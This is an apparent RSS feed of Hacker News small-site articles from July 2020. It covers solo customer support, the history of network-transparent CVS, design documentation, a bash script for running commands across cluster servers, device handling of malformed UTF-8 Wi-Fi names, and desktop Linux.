<p>I used to think that if I were to hire someone, it would first be a customer support agent but I’ve since been moving away from that idea. Users are constantly surprised (in a good way!) when they realize the founder is responding to their bug reports or feature requests directly.</p>

<p><strong>Consistently providing great customer support is a long-term investment for Lunch Money</strong> as it is undoubtedly a great way to turn customers into champions. As I receive and respond to support tickets, I’m also able to identify and overhaul the common sources of trouble for users.</p>

<p>I’ve always believed that customer support would be the most important and the hardest part of the business to scale, especially if I have the goal of staying a company of one.</p>

<p>Corroborating data from <a href="https://emailmeter.com/">EmailMeter</a> and my database, it seems my changes are making a difference. Despite a growing user base, inbound support emails remain fairly steady!</p>

<p><img src="https://lunchbag.ca/uploads/screen-shot-2020-05-21-at-4-20-15-pm.png"><span>Handling support on my own should be sustainable at least for the foreseeable future!</span></p>

<h2 id="how-do-support-tickets-work-at-lunch-money">How do support tickets work at Lunch Money?</h2>

<p>A feedback button is located at the bottom right corner of every page. Clicking on it opens up a text area wherein users can submit feature requests, questions, bug …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://lunchbag.ca/company-of-one">https://lunchbag.ca/company-of-one</a></em></p>]]>
            </description>
            <link>https://lunchbag.ca/company-of-one</link>
            <guid isPermaLink="false">hacker-news-small-sites-23732759</guid>
            <pubDate>Sat, 04 Jul 2020 15:10:32 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How Do We Get a Balanced Binary Tree?]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=23732683">thread link</a>) | @sciencewolf
<br/>
July 4, 2020 | https://algodaily.com/lessons/how-do-we-get-a-balanced-binary-tree/introduction | <a href="https://web.archive.org/web/*/https://algodaily.com/lessons/how-do-we-get-a-balanced-binary-tree/introduction">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://algodaily.com/lessons/how-do-we-get-a-balanced-binary-tree/introduction</link>
            <guid isPermaLink="false">hacker-news-small-sites-23732683</guid>
            <pubDate>Sat, 04 Jul 2020 15:01:21 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Building Subversion – Software that doesn't suck]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=23732311">thread link</a>) | @agbell
<br/>
July 4, 2020 | https://corecursive.com/054-software-that-doesnt-suck/ | <a href="https://web.archive.org/web/*/https://corecursive.com/054-software-that-doesnt-suck/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><span>Software is just the tool and it should get out of your way. In this episode, Jim discusses how to build a great developer tool.&nbsp; It all started with: “What’s the worst software that you use every day?”&nbsp;</span></p><h3><b>Transcript</b></h3><p><em>This is a machine-translated transcript. Podcast page for<a href="https://corecursive.com/software-that-doesnt-suck-with-jim-blandy/" target="_blank" rel="noopener noreferrer"> this episode is here</a></em></p><h3><b>Introduction</b></h3><p><b>Jim:</b><span> Basically, there was a coworker of mine who said, CVS’s repositories indexed backward. <strong>CVS is the software equivalent of a telephone book sorted by telephone number.</strong> And that’s a funny lunch comment, right? And basically I was just thinking about it myself, you know, doing the dishes every night but the thing is you can’t just accept something like that. You have to say, well, wait a second. <strong>If CVS is backward, what would it look like if it were right?&nbsp;</strong></span></p><p><b>Adam:</b><span> Welcome to the CoRecursive, I’m Adam Gordon Bell. Today, our topic is what would it look like if CVS was not backward? CVS is a source control management tool. Think of the early 90’s – Git.</span></p><p><span>Jim Blandy is my guest and he brings us the story of making CVS better.&nbsp;</span></p><p><span>I would guess that a number of features of your current source control tools that you probably use every day we’re influenced by Jim’s work. I also think he has some interesting insights on how you build great developer tools and also how to recognize when some improvements to the existing tools will topple the current market leader are something that he’s done twice.</span></p><p><span>We started the story of the year in 1993. It’s the year the Mosaic web browser came out. You know, email has been around for some time, but the web was fairly young and CVS was the most popular open-source source control system.&nbsp;</span></p><h2><b>Network Transparent CVS &amp; The Commune</b></h2><p><b>Jim:</b><span> So I went on this trip that I was going to go on in Europe and Japan, and I came back to the US and I had no job. And no apartment. And my friend had gotten a job. My friend Carl Fogel had gotten a job working at the University of Illinois, Urbana Champaign on a gene-editing mode for Emacs. And this is an Emacs, you visit a file that’s full of genetic data and Emacs will bring it up and it’ll apply colors to it, and you can like select, you know, rectangles and stuff like that.</span></p><p><span>But he was living in Illinois at this lab at UIUC, and I was living in Indiana and so we were collaborating across the net and this was 1993. And so the way you collaborated across the net was you shipped people patches, you emailed people patches, you FTP, do your sources,&nbsp; network, transparent version control was not a thing. But, I had an old friend from college who had gone to work for a Silicon Valley startup, except he didn’t want to live in Silicon Valley. He wants to live on a commune in the Hills of Virginia. And so they ran a frame relay line, out to the commune because, you know rural telephone access, right? And there he was on this commune, you and everybody else was making hammocks and nut butter, and he was hacking on code for Silicon Valley and so his income was probably a significant portion of the whole communes income, but, there he was, and he realized that it was kind of lousy doing this collaboration at a distance, his name is Jim Kingdon and he was just an amazing hacker and he sort of disappeared from the world after this and I don’t know why, because he is amazingly talented. What he did is he took the CVS version control system, this was like I said, this is ‘90, ‘93.</span></p><p><span>It was designed for a situation where you have lots of people using the same computer, right? And so you have your CVS repository in one part of the file system that’s shared by all the users. And then people are checking out copies of the tree into their own home directories, making local changes, doing updates, doing commits, right?</span></p><p><span>And so they’re doing all of this activity but it’s all on one machine. It’s all one local file system because people would share their computers back then because that was what you have to do.&nbsp; So what Jim Kingdon did is he took this CVS version control system that was designed to work locally only and basically, by I sheer force of intellectual will, he ripped it apart into a client and server and he invented a protocol to go with it that like and the protocol even like, you know, minimize round trip times to keep latency down and all this just amazing stuff, right? It’s a program that wasn’t designed to be a network program at all, and he turned it into a network program and then he used Kerberos for authentication and it was real network security back in 1993. He used it for collaboration with his startup that he was working for, which was, Signus Solutions in Silicon Valley. And so, you know, it was this amazing thing but he didn’t publish it, he just used it.</span></p><p><span>He wrote it for himself and for maybe other people in his company. And then he just used it and so I had heard that he had done this and here I am trying to collaborate with my friend Carl in Illinois and so I wrote him and I said, Hey, you know, do you think I could get a copy of this code?</span></p><p><span>And he says, “Oh yeah, sure. But on one condition, you can’t ask me any questions.” because basically he doesn’t want to get into the support thing. I think this is probably why he didn’t publish it in the first place.</span></p><p><b>Adam:</b><span> That makes sense. Yeah.</span></p><p><b>Jim:</b><span>&nbsp;So I said, “Oh yeah, sure, fine.” You know, give me a copy. And so he sends me a tarball of it and other sources and so immediately I asked him a question and he’s like, I told you not to ask me any questions.</span></p><p><span>Carl and I started using it like, this is amazing! Right? Because you set up a server on some machine somewhere and you do a checkout and you get the sources and then you work locally and nobody gets in your way, and then you just commit and poof! it’s there for everybody else to see.</span></p><p><span>Right? It’s just a whole new world. And so, you know, we were just blown away,&nbsp; at how much better it was to collaborate. Over the net using the network transparent CVS.&nbsp;</span></p><p><b>Adam: </b><span>So since CVS is GPL, Jim takes these improvements and he releases them to the world like a fork.</span></p><h2><b>Waiting Tables &amp; Drug testing</b></h2><p><b>Jim:</b><span> At first, the official CVS, the mainstream CVS distribution was like, Oh yeah, interesting work. But you know, we have our own ideas about how we’re going to do things because everybody — nobody likes existing code. Everybody likes imaginary code because imaginary code is always perfect.&nbsp;</span></p><p><b>Adam:</b><span> Yeah. And you’re like, we already have this. It’s done, you can use it.</span></p><p><b>Jim:</b><span> Yeah, you could use it and then but they didn’t want it because they wanted to do their own thing. But you know, after a few months it becomes clear that they don’t have network transparency and we do have network transparency and basically everybody is switching over to cyclic CVS, which is what we called it and they capitulate and say, “okay, I guess we’ll merge your changes”. And that is how network transparent CVS came to be. And, you know, within a year, all of the open-source worlds were using this. Because when you think about the kind of collaboration that has to happen with open source, you know, it’s all distributed teams.</span></p><p><span>It’s people from everywhere you get volunteers, you have no idea where they’re coming from. There’s no physical locality to it at all and it took over the open-source world by storm and within a few years, pretty much CVS was the standard.</span></p><p><b>Adam:</b><span> This network transparent CVS became such the standard both in open source and in the corporate world. Jim got some interest in contracting work, just helping people understand how to use it.&nbsp;</span></p><p><b>Jim:</b><span> One of the biggest thrills I ever got was when I was just going around to different companies and government groups and teaching them how to use CVS.</span></p><p><span>And I got an invitation to teach for a few days. I think it was a three-day course at the Goddard space flight center, out on the East coast and so here I was teaching these folks who were doing satellite development and doing weather analysis. And I remember one day over lunch,</span></p><p><span>one of them said, you know, we’ve been having this bug with CVS I wonder if you could help us out with it and so I said, sure. And so we walked down to his cubicle and AEs says, well, okay, here, let’s, let’s, and so we just check something out. It just checks out a tree with CVS. And I say, well, what is it?</span></p><p><span>And he says, Oh, this is the stuff that analyzes satellite data, satellite images,&nbsp; to analyze,&nbsp; hurricanes and predict where they’re going to go. And there was just something like just seeing that checkout, right? CVS lists each file as it downloads it from the server and checks it out. It’s like, Whoa! I’m actually helping people do stuff, you know? Right. Here’s this person who is just trying to, you know, track hurricanes. And because we made this thing, they were able to do that&nbsp; is a really exciting feeling. That they’re not really interested in your software they’re just using it to get something done and that because you were there, they were able to do it.</span></p><h2><b>Cyclic Software</b></h2><p><b>Adam:</b><span> Jim and his buddy Carl didn’t let this good opportunity go to waste. So they start a business cyclic software that offers support for cyclic CVS for network-transparent source control.&nbsp;</span></p><p><b>Jim:</b><span> Our little business failed to die in the first four horrible ways that businesses always die.&nbsp; We’ve paid ourselves a salary, we earned back our initial investment and actually made a little bit of money beyond that and we had customers. One of our clients was Goldman Sachs. It turned out the Goldman Sachs was using CVS internally and they really liked network transparent CVS. And so Goldman Sachs wanted us to port it. I think they wanted reserved checkouts or something like that.</span></p><p><span>And so here we are, two guys basically we’re grad student age and we’re like, okay, we’re going to write a contract with Goldman Sachs and so we’d go consult a lawyer and stuff like that and we send Goldman Sachs our little contract. You know their full legal department comes to bear on this thing and everything that we wrote them becomes exhibit A and then they have this big, whatever is 15 pages of …</span></p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://corecursive.com/054-software-that-doesnt-suck/">https://corecursive.com/054-software-that-doesnt-suck/</a></em></p>]]>
            </description>
            <link>https://corecursive.com/054-software-that-doesnt-suck/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23732311</guid>
            <pubDate>Sat, 04 Jul 2020 14:14:37 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Code Only Says What It Does]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=23732244">thread link</a>) | @luu
<br/>
July 4, 2020 | http://brooker.co.za/blog/2020/06/23/code | <a href="https://web.archive.org/web/*/http://brooker.co.za/blog/2020/06/23/code">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="post">


<p>Only loosely related to what it should do.</p>


<p>Code says what it does. That's important for the computer, because code is the way that we ask the computer to do something. It's OK for humans, as long as we never have to modify or debug the code. As soon as we do, we have a problem. Fundamentally, debugging is an exercise in changing what a program does to match what it should do. It requires us to know what a program should do, which isn't captured in the code. Sometimes that's easy: What it does is crash, what it should do is <em>not crash</em>. Outside those trivial cases, discovering intent is harder.</p>

<p>Debugging when <em>should do</em> is subtle, such as when building distributed systems protocols, is especially difficult. In our <a href="https://www.usenix.org/conference/nsdi20/presentation/brooker">Millions of Tiny Databases</a> paper, we say:</p>

<blockquote><p>Our code reviews, simworld tests, and design meetings frequently referred back to the TLA+ models of our protocols to resolve ambiguities in Java code or written communication.</p></blockquote>

<p>The problem is that the implementation (in Physalia's case the Java code) is both an imperfect implementation of the protocol, and an overly-specific implementation of the protocol. It's overly-specific because it needs to be fully specified. Computers demand that, and no less, while the protocol itself has some leeway and wiggle room. It's also overly-specific because it has to address things like low-level performance concerns that the specification can't be bothered with.</p>

<p><em>Are those values in an ArrayList because order is actually important, or because O(1) random seeks are important, or some other reason? Was it just the easiest thing to write? What happens when I change it?</em></p>

<p>Business logic code, while lacking the cachet of distributed protocols, have even more of these kinds of problems. Code both over-specifies the business logic, and specifies it inaccurately. I was prompted to write this by a tweet from @mcclure111 where she hits the nail on the head:</p>

<blockquote data-conversation="none" data-dnt="true"><p lang="en" dir="ltr">Since most software doesn't have a formal spec, most software "is what it does", there's an incredible pressure to respect authorial intent when editing someone else's code. You don't know which quirks are load-bearing.</p>— mcc 🏳️‍⚧️🏳️‍🌈 (@mcclure111) <a href="https://twitter.com/mcclure111/status/1274422600236765186?ref_src=twsrc%5Etfw">June 20, 2020</a></blockquote>




<p>This is a major problem with code: <em>You don't know which quirks are load-bearing.</em> You may remember, or be able to guess, or be able to puzzle it out from first principles, or not care, but all of those things are slow and error-prone. What can we do about it?</p>

<p><strong>Design Documentation</strong></p>

<p>Documentation is uncool. Most software engineers seem to come out of school thinking that documentation is below them (<em>tech writer work</em>), or some weird thing their SE professor talked about that is as archaic as Fortran. Part of this is understandable. My own software engineering courses emphasized painstakingly documenting the implementation in UML. No other mention of documentation was made. Re-writing software in UML helps basically nobody. I finished my degree thinking that documentation was unnecessary busywork. Even the <a href="https://agilemanifesto.org/">Agile Manifesto</a> agreed with me<sup><a href="#foot1">1</a></sup>:</p>

<blockquote><p>Working software over comprehensive documentation</p></blockquote>

<p>What I discovered later was that design documentation, encoding the intent and decisions made during developing a system, helps teams be successful in the short term, and people be successful in the long term. Freed from fitting everything in my head, emboldened by the confidence that I could rediscover forgotten facts later, I could move faster. The same applies to teams.</p>

<p>One thing I see successful teams doing is documenting not only the <em>what</em> and <em>why</em> behind their designs, but the <em>how they decided</em>. When it comes time to make changes to the system—either for debugging or in response to changing requirements—these documents are invaluable. It's hard to decide whether its safe to change something, when you don't know why it's like that in the first place. The record of how you decided is important because you are a flawed human, and understanding how you came to a decision is useful to know when that decision seems strange, or surprising.</p>

<p>This documentation process doesn't have to be heavyweight. You don't have to draw painstaking <a href="https://en.wikipedia.org/wiki/Entity%E2%80%93relationship_model">ER diagrams</a> unless you think they are helpful. You should probably ignore UML entirely. Instead, describe the system in prose as clearly and succinctly as you can. One place to start is by building an RFC template for your team, potentially inspired by one that you find on the web. <a href="https://static1.squarespace.com/static/56ab961ecbced617ccd2461e/t/5d792e5a4dac4074658ce64b/1568222810968/Squarespace+RFC+Template.pdf">SquareSpace</a>'s template seems reasonable. Some designs will fit well into that RFC format, other's won't. Prefer narrative writing where you can.</p>

<p>Then, keep the documents. Store them somewhere safe. Soak them in vinegar <a href="https://www.almanac.com/content/home-remedies-cough-relief">and tie them around your chest</a>. You're going to want to make sure that the people who need to maintain the system can find them. As they are spelunking through history, help them feel more like a library visitor and less like Lara Croft.</p>

<p>I'm not advocating for Big Design Up Front. Many of the most important things we learn about a project we learn during the implementation. Some of the most important things we learn years after the implementation is complete. Design documentation isn't a static one-time ahead-of-time deliverable, but an ongoing process. Most importantly, design documentation is not a commitment to bad ideas. If it's wrong, fix it and move forward. Documentation is not a deal with the devil.</p>

<p><strong>Comments</strong></p>

<p>Few topics invite a programmer flame war like comments. We're told that comments are silly, or childish, or make it hard to show how manly you are in writing that convoluted mess of code. If it was hard to write, it should be hard to read. After all, you're the James Joyce of code.</p>

<p>That silliness aside, back to @mcclure111's thread:</p>

<blockquote data-conversation="none" data-dnt="true"><p lang="en" dir="ltr">This means comments that *reveal* authorial intent are valuable, and comments that reveal *there was no authorial intent* are even more valuable. Without those hints, you're left editing superstitiously, preserving quirks even when you don't know why. <a href="https://t.co/YhvWnXjp9i">https://t.co/YhvWnXjp9i</a></p>— mcc 🏳️‍⚧️🏳️‍🌈 (@mcclure111) <a href="https://twitter.com/mcclure111/status/1274422825831596039?ref_src=twsrc%5Etfw">June 20, 2020</a></blockquote>




<p>Comments allow us to encode <em>authorial intent</em> into our code in a way that programming languages don't always. Types, traits, interfaces, and variable names do put intent into code, but not completely (I see you, type system maximalists). These same things allow us to communicate a lack of intent—consider <a href="https://docs.oracle.com/javase/8/docs/api/java/util/RandomAccess.html">RandomAccess</a> vs <a href="https://docs.oracle.com/javase/8/docs/api/java/util/ArrayList.html">ArrayList</a>—but are also incomplete. Well-commented code should make the intent of the author clear, especially in cases where that intent is either lost in the translation to code, or where implementation constraints hide the intent of the design. Code comments that link back to design documents are especially useful.</p>

<p>Some languages need comments more than others. Some, like SQL, I find to nearly always obscure the intent of the design behind implementation details.</p>

<p><strong>Formal Specification</strong></p>

<p>In <a href="https://cacm.acm.org/magazines/2015/4/184705-who-builds-a-house-without-drawing-blueprints/fulltext">Who Builds a House Without Drawing Blueprints?</a> Leslie Lamport writes:</p>

<blockquote><p>The need for specifications follows from two observations. The first is that it is a good idea to think about what we are going to do before doing it, and as the cartoonist Guindon wrote: "Writing is nature's way of letting you know how sloppy your thinking is."</p>

<p>The second observation is that to write a good program, we need to think above the code level.</p></blockquote>

<p>I've found that specification, from informal specification with narrative writing to formal specification with TLA+, makes writing programs faster and helps reduce mistakes. As much as I like that article, I think Lamport misses a key part of the value of formal specification: it's a great communication tool. In developing some of the trickiest systems I've built, I've found that heavily-commented formal specifications are fantastically useful documentation. Specification languages are all about <em>intent</em>, and some make it easy to clearly separate intent from implementation.</p>

<p>Again, from our <a href="https://www.usenix.org/conference/nsdi20/presentation/brooker">Millions of Tiny Databases</a> paper:</p>

<blockquote><p>We use TLA+ extensively at Amazon, and it proved exceptionally useful in the development of Physalia.  Our team used TLA+ in three ways: writing specifications of our protocols to check that we understand them deeply, model checking specifications against correctness and liveness properties using the TLC model checker, and writing extensively commented TLA+ code to serve as the documentation of our distributed protocols. While all three of these uses added value, TLA+’s role as a sort of automatically tested (via TLC),and extremely precise, format for protocol documentation was perhaps the most useful.</p></blockquote>

<p>Formal specifications make excellent documentation. Like design docs, they aren't immutable artifacts, but a reflection of what we have learned about the problem.</p>

<p><strong> Conclusion </strong></p>

<p>Building long-lasting, maintainable, systems requires not only communicating with computers, but also communicating in space with other people, and in time with our future selves. Communicating, recording, and indexing the intent behind our designs is an important part of that picture. Make time for it, or regret it later.</p>

<p><strong>Footnotes</strong></p>

<ol>
<li><a name="foot1"></a> To be charitable to the Agile folks, <em>comprehensive</em> does seem to be load-bearing.</li>
</ol>


</div></div>]]>
            </description>
            <link>http://brooker.co.za/blog/2020/06/23/code</link>
            <guid isPermaLink="false">hacker-news-small-sites-23732244</guid>
            <pubDate>Sat, 04 Jul 2020 14:05:06 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Shell tricks for simple cluster management]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 1 (<a href="https://news.ycombinator.com/item?id=23732219">thread link</a>) | @srijanshetty
<br/>
July 4, 2020 | https://srijanshetty.in/technical/shell-tricks-to-manage-a-cluster/ | <a href="https://web.archive.org/web/*/https://srijanshetty.in/technical/shell-tricks-to-manage-a-cluster/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="main" role="main">

<article>

<div>
<p>There are complex solutions available for server management, some of you might even be on the <em>containerization train</em>.
Sometimes you just want to run a quick command on every server, it could be a one off to check <code>uptime</code> or a simple
check for <code>lockfiles</code>. Here’s a simple script which runs a shell command on a list of servers.</p>
<div><div><pre><code><span>#!/usr/bin/env bash</span>

<span>set</span> <span>-u</span>

<span>ACTION</span><span>=</span><span>${</span><span>1</span>:?<span>"Must supply action"</span><span>}</span>
<span>HOST</span><span>=</span><span>${</span><span>2</span>:?<span>"Must supply host name"</span><span>}</span>

<span>source</span> ./scripts/lib.sh

<span># Expand host string</span>
<span>HOSTS</span><span>=</span><span>"</span><span>$(</span>GET_HOSTS <span>$HOST</span><span>)</span><span>"</span>            <span># GET_HOSTS is a lists all hosts</span>

<span># Command to SSH</span>
SSH_COMMAND<span>()</span> <span>{</span>
    <span>local </span><span>ip</span><span>=</span><span>"</span><span>$(</span>GET_IP <span>$1</span><span>)</span><span>"</span>           <span># GET_IP is maps hostname to IP</span>
    ssh <span>"</span><span>${</span><span>TARGET_USER</span><span>}</span><span>@</span><span>${</span><span>ip</span><span>}</span><span>"</span> <span>"</span><span>$2</span><span>"</span>
<span>}</span>

<span># Run command for each host</span>
<span>declare</span> <span>-A</span> results
<span>for </span>H <span>in</span> <span>$HOSTS</span><span>;</span> <span>do</span>
    <span># Redirect output to a temp file, later redirect back to stdio</span>
    <span>temp</span><span>=</span><span>$(</span><span>mktemp</span><span>)</span>
    <span>exec</span> &amp;&gt; <span>${</span><span>temp</span><span>}</span>

    <span># Not the '&amp;', this creates a background process.</span>
    <span># We also source the env on the host,</span>
    <span># as .bashrc and .bash_profile are finicky at times</span>
    <span>printf</span> <span>"</span><span>\n</span><span>Running command %s %s </span><span>\n</span><span>"</span> <span>"</span><span>${</span><span>ACTION</span><span>}</span><span> </span><span>${</span><span>H</span><span>}</span><span>"</span>
    SSH_COMMAND <span>"</span><span>$H</span><span>"</span> <span>"source ~/app/scripts/env.sh; </span><span>${</span><span>ACTION</span><span>}</span><span>"</span> &amp; 

    <span># '$!' is the PID which maps to the correct temp file</span>
    results[<span>$!</span><span>]=</span><span>$temp</span>
<span>done</span>

<span># Restore stdout and stderr</span>
<span>exec</span> &amp;&gt; /dev/tty

<span># Wait for the jobs that were executed</span>
<span>for </span>pid <span>in</span> <span>"</span><span>${</span><span>!results[@]</span><span>}</span><span>"</span><span>;</span> <span>do
    </span><span>wait</span> <span>$pid</span>
    <span>cat</span> <span>"</span><span>${</span><span>results</span><span>[</span><span>$pid</span><span>]</span><span>}</span><span>"</span>
<span>done</span>
</code></pre></div></div>
<p>There’s a lot to dissect in this little snippet. Let’s get right to it.</p>
<ul>
<li><code>set -u</code>: Most bash guides will ask you to use <code>set -eEuo pipefail</code>, but you would not want to use that especially
when you parallelize using background proccesses in bash. This would mean partial execution and we want to avoid that
all costs. The only error that we care about is <em>undefined variables</em>, hence the <em>set -u</em></li>
<li><code>GET HOSTS</code>: A simple function to generate a list of hosts that you want to run the command on.</li>
<li><code>exec &amp;&gt; ${temp} and exec &amp;&gt; /dev/tty</code>: This redirects the output temporarily and later resets it to the terminal.</li>
<li><code>results[$!]=$temp</code>: To keep track of which pid points to which output file.</li>
<li><code>for pid in "${!results[@]}"</code>: Traverse over every pid in the map and wait on it.</li>
</ul>
<p>This simple scripts saves a lot of time especially when you’re managing a cluster of servers.</p>
<hr>

</div>

</article>
</div></div>]]>
            </description>
            <link>https://srijanshetty.in/technical/shell-tricks-to-manage-a-cluster/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23732219</guid>
            <pubDate>Sat, 04 Jul 2020 14:01:48 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Comparing how different devices handle invalid UTF8 characters as SSIDs]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=23732211">thread link</a>) | @herohamp
<br/>
July 4, 2020 | https://hamptonmoore.com/posts/weird-wifi-names-cont/ | <a href="https://web.archive.org/web/*/https://hamptonmoore.com/posts/weird-wifi-names-cont/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>   <p>This is a continuation of my previous post <a href="https://hamptonmoore.com/posts/weird-wifi-name-display/">Comparing how different devices display the SSID “á̶̛̛̓̿̈͐͆̐̇̒̑̈́͘͝aaa”</a>. After posting it on HackerNews I got lots of feedback. The key one was something that I had sadly missed when I originally started this project. When the WiFi name of “á̶̛̛̓̿̈͐͆̐̇̒̑̈́͘͝aaa” got shortened down to a one byte before the second “a” due to the 32 byte/octet limit of SSIDs. The issue was this character is actually two bytes wide, so the first part of the character stayed, with the second byte of it missing. The character in question was ◌̈́, with the hex codepoint cd84. Looking at the raw hex of the SSID you can see it ends in cd, <code>61ccb6cc81cc93ccbfcc88cc9bcc9bcd90cd98cd86cc90cd9dcc87cc92cc91cd</code>. For those curious about how that would be rendered on your device here it is “á̶̛̛̓̿̈͐͆̐̇̒̑͘͝�”. After realizing this I decided my previous comparisons of how devices reacted to my weird unicode SSID was unfair. The SSID this time is “á̶̛̛̓̿̈͐͆̐̇̒̑͘͝a” which is almost the exact same but that last two byte long character was replaced with an “a”. This was to keep the SSID at 32 octets long. Looking at the new hex of the SSID <code>61ccb6cc81cc93ccbfcc88cc9bcc9bcd90cd98cd86cc90cd9dcc87cc92cc9161</code> you can see that is is identical baring the <code>61</code> instead of a <code>cd</code> at the end.</p> <p>Below are the previous photos of the previous SSID “á̶̛̛̓̿̈͐͆̐̇̒̑͘͝�” with the new SSID “á̶̛̛̓̿̈͐͆̐̇̒̑͘͝a” under it. They are also grouped the same as previously to keep continuity.</p> <p>Galaxy S8 running Android 9 with Kernel 4.4.153 <img src="https://cdn.hampton.pw/hampton.pw/resources/iosWifiBug/android.jpg" alt=""></p> <p><img src="https://cdn.hampton.pw/hampton.pw/resources/iosWifiBug/d2/android.jpg" alt=""></p> <p>Amazon Firestick <img src="https://cdn.hampton.pw/hampton.pw/resources/iosWifiBug/firestick.jpg" alt=""></p> <p><img src="https://cdn.hampton.pw/hampton.pw/resources/iosWifiBug/d2/firestick.jpg" alt=""></p> <p>As before the Galaxy S8 and the Firestick both handled it perfectly with there being no issues with how it rendered besides vertical cutoff which makes sense.</p> <p>iPhone running iOS 13.5.1 <img src="https://cdn.hampton.pw/hampton.pw/resources/iosWifiBug/iphone-ios1351.jpg" alt=""> <img src="https://cdn.hampton.pw/hampton.pw/resources/iosWifiBug/d2/iphone-ios1351.jpg" alt=""></p> <p>Apple TV Second Generation <img src="https://cdn.hampton.pw/hampton.pw/resources/iosWifiBug/appletvgen2.jpg" alt=""> <img src="https://cdn.hampton.pw/hampton.pw/resources/iosWifiBug/d2/appletvgen2.jpg" alt=""></p> <p>These results were interesting. It showed that if the UTF-8 character in an SSID is invalid then IOS falls back to the <a href="https://en.wikipedia.org/wiki/Mac_OS_Roman">Mac OS Roman</a> character set, but since the new SSID is valid UTF-8 iOS properly renderers the SSID.</p> <p>2012 Macbook running High Sierra 10.13.6 <img src="https://cdn.hampton.pw/hampton.pw/resources/iosWifiBug/d2/macos.jpg" alt=""></p> <p>Unlike last time the Macbook actually showed the network. I believe last time instead of falling back to Mac OS Roman like iOS the Macbook just treated the SSID as spam or noise and dropped it</p> <p>Windows 10 Pro 10.0.19041 <img src="https://cdn.hampton.pw/hampton.pw/resources/iosWifiBug/windows10.png" alt=""></p> <p><img src="https://cdn.hampton.pw/hampton.pw/resources/iosWifiBug/d2/windows10.jpg" alt=""></p> <p>Windows was able to properly handle this SSID as opposed to falling back to <a href="https://en.wikipedia.org/wiki/Windows-1252">Windows-1252</a> like it did previously.</p> <p>Chromebook running ChromeOS 83.0.4103.97 <img src="https://cdn.hampton.pw/hampton.pw/resources/iosWifiBug/chromeos.jpg" alt=""></p> <p><img src="https://cdn.hampton.pw/hampton.pw/resources/iosWifiBug/d2/chromeos.jpg" alt=""></p> <p>Unlike last time the Chromebook was able to render this perfectly with no question marks.</p> <p>Kindle Paperwhite running Firmware 5.10.2 <img src="https://cdn.hampton.pw/hampton.pw/resources/iosWifiBug/kindlepaperwhite.jpg" alt=""></p> <p><img src="https://cdn.hampton.pw/hampton.pw/resources/iosWifiBug/d2/kindlepaperwhite.jpg?" alt=""></p> <p>Vizio M55-C2 TV <img src="https://cdn.hampton.pw/hampton.pw/resources/iosWifiBug/viziom55-c2.jpg" alt=""> <img src="https://cdn.hampton.pw/hampton.pw/resources/iosWifiBug/d2/viziom55-c2.jpg" alt=""></p> <p>Unlike last time the kindle was able to show the SSID without escape any of the characters. Sadly the Vizio was not able to show the SSID and just fell back to escaped hex.</p> <p>The results from changing the SSID showed a couple things, namely devices really do not like it when they are given invalid or incomplete UTF-8 codes and lots of devices handle UTF-8 text much better than I thought they would. It also showed that some devices fallback to their native 8 bit encoding formats when they see an invalid UTF-8 codepoint, there is probably some room for exploitation here like inserting escape keys. I originally was not expecting the kindle to work at all, nor the chromebook after seeing the slew of question marks originally. Android was also found to be at handling text with invalid UTF-8 characters it just removed them as opposed to switching up formatting, falling back to hex, or erroring out with all question marks.</p> <p>Thank you to everyone who provided valuable feedback on the previous post. I have more research I plan ond doing with this in the future.</p> <p>Lastly if anyone would like to run this test themselves and send me the comparison results to be added my email is <code>me (at) hampton (This key &gt; not shifted) pw</code>.</p> <hr> <p> Hello reader. I do not normally like to put advertisements or promotions on my website, but recently a good friend of my Jaden Ann Scrivener died in a car crash. She was known in the community as the most caring and energetic person around. She was a beam of sunshine and happiness brightening up the day of anyone who interacted with her. If you could <a href="https://www.aplos.com/aws/give/RayofHopeMedicalMissionsInc/Jaden">please donate to her memorial fund</a>. All the proceeds will go to the <a href="https://www.rohmm.org/">Ray of Hope Medical Missions</a> which facilitates life-changing surgeries, reduces infant mortality, and provides mission opportunities locally. </p> </article></div>]]>
            </description>
            <link>https://hamptonmoore.com/posts/weird-wifi-names-cont/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23732211</guid>
            <pubDate>Sat, 04 Jul 2020 14:00:37 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Another non-year of Linux on the desktop]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 4 (<a href="https://news.ycombinator.com/item?id=23731963">thread link</a>) | @grahamlee
<br/>
July 4, 2020 | https://www.sicpers.info/2020/07/another-non-year-of-desktop-linux/ | <a href="https://web.archive.org/web/*/https://www.sicpers.info/2020/07/another-non-year-of-desktop-linux/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>


<p>Let’s look at other software on the desktop, to understand why there isn’t (as a broad, popular platform) Linux on the desktop, then how there could be.</p>





<p>Over on De Programmatica Ipsum I discussed <a href="https://deprogrammaticaipsum.com/cross-platform-is-the-platform/">the difference between the platform business model, and the technology platform</a>. In the platform model, the business acts as a matchmaking agent, connecting customers to vendors. An agricultural market is a platform, where stud farmers can meet dairy farmers to sell cattle, for example.</p>





